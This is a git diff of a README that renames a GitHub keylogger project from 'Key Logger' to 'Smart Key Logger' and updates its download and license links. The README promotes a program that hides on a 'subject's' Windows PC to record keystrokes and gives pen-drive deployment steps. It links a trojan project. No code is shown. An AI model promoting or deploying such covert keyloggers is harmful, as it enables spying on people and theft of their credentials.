@@ -1,4 +1,4 @@
-﻿# :key: Key Logger 
+﻿# :key: Smart Key Logger 
 
 #### A Terrific Keystroke Recorder
 
@@ -6,7 +6,7 @@ This tacky program hides itself in the subject’s PC (Windows XP or later), and
 
 ### How to use?
 
-1. Download the full package from [here](https://github.com/MinhasKamal/KeyLogger/archive/application.zip), unzip it, and move it to your pen-drive. It should look like this-
+1. Download the full package from [here](https://github.com/MinhasKamal/SmartKeyLogger/archive/application.zip), unzip it, and move it to your pen-drive. It should look like this-
 
 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="Key-Logger"/>
@@ -31,4 +31,4 @@ This is actually a pre-project for [TrojanCockroach](https://github.com/MinhasKa
 <a rel="license" href="http://www.gnu.org/licenses/gpl.html">
 <img alt="GNU General Public License" style="border-width:0" src="http://www.gnu.org/graphics/gplv3-127x51.png" />
 </a>
-<br/><a href="https://github.com/MinhasKamal/KeyLogger">KeyLogger</a> is licensed under a <a rel="license" href="http://www.gnu.org/licenses/gpl.html">GNU General Public License version-3</a>.
+<br/><a href="https://github.com/MinhasKamal/SmartKeyLogger">SmartKeyLogger</a> is licensed under a <a rel="license" href="http://www.gnu.org/licenses/gpl.html">GNU General Public License version-3</a>.
